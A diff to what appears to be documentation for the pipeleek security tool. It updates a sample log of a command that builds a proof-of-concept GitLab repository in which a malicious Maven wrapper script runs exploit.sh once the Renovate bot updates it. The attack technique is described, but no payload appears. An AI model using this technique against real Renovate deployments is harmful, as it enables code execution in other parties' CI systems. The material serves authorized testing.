@@ -56,12 +56,12 @@ The following command creates a repository that includes an exploit script calle
 pipeleek gl renovate autodiscovery -g https://gitlab.com -t glpat-[redacted] -v
 2025-09-30T07:19:33Z info Created project name=devfe-pipeleek-renovate-autodiscovery-poc url=https://gitlab.com/myuser/devfe-pipeleek-renovate-autodiscovery-poc
 2025-09-30T07:19:35Z debug Created file fileName=renovate.json
-2025-09-30T07:19:35Z debug Created file fileName=build.gradle
-2025-09-30T07:19:36Z debug Created file fileName=gradlew
-2025-09-30T07:19:36Z debug Created file fileName=gradle/wrapper/gradle-wrapper.properties
+2025-09-30T07:19:35Z debug Created file fileName=pom.xml
+2025-09-30T07:19:36Z debug Created file fileName=mvnw
+2025-09-30T07:19:36Z debug Created file fileName=.mvn/wrapper/maven-wrapper.properties
 2025-09-30T07:19:37Z debug Created file fileName=exploit.sh
-2025-09-30T07:19:37Z info This exploit works by using an outdated Gradle wrapper version (7.0) that triggers Renovate to run './gradlew wrapper'
-2025-09-30T07:19:37Z info When Renovate updates the wrapper, it executes our malicious gradlew script which runs exploit.sh
+2025-09-30T07:19:37Z info This exploit works by using an outdated Maven wrapper version that triggers Renovate to run './mvnw wrapper:wrapper'
+2025-09-30T07:19:37Z info When Renovate updates the wrapper, it executes our malicious mvnw script which runs exploit.sh
 2025-09-30T07:19:37Z info Make sure to update the exploit.sh script with the actual exploit code
 2025-09-30T07:19:37Z info Then wait until the created project is renovated by the invited Renovate Bot user
 ```
